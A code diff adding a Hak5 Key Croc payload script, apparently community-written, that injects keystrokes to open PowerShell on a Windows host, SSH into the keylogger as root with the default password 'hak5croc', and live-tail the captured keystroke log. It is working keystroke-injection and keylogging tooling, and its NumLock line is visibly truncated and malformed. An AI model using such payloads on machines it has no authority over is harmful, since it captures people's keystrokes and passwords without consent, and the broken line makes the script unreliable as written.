@@ -1,0 +1,45 @@
+# Title:         Windows SSH
+# Description:   Logs into key croc over ssh
+# Author:        RootJunky / Spywill
+# Version:       2.0
+# Category:      Key Croc
+#
+#
+MATCH winssh
+# lock keyboard.
+Q LOCK
+Q GUI r
+sleep 1
+Q STRING "powershell"
+Q ENTER
+sleep 2
+# make sure num-lock is turned on as the keycroc requires this setting.
+Q STRING "If ([console]::NumberLock -eq \$False) {(\$wsh = New-Object -ComObject WScript.Shell) -and (\$wsh.SendKeys('{$Q ENTER
+sleep
+# connect to the KeyCroc over SSH with the device IP address.
+Q STRING "ssh root@"
+sleep 1
+Q STRING $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
+sleep 1
+Q ENTER
+sleep 1
+# Enter default password
+Q STRING "hak5croc"
+Q ENTER
+sleep 1
+# cd to loot folder and start a live key logger. 
+Q STRING "cd loot"
+Q ENTER
+sleep 1
+# press control +c to exit
+Q STRING echo "press control + c to exit this live key log"
+Q ENTER
+Q ENTER
+Q ENTER
+Q STRING "tail -f croc_char.log"
+Q ENTER
+Q UNLOCK
+# unlock keyboard.
+LED FINISH
+Q DELAY 1000
+LED OFF
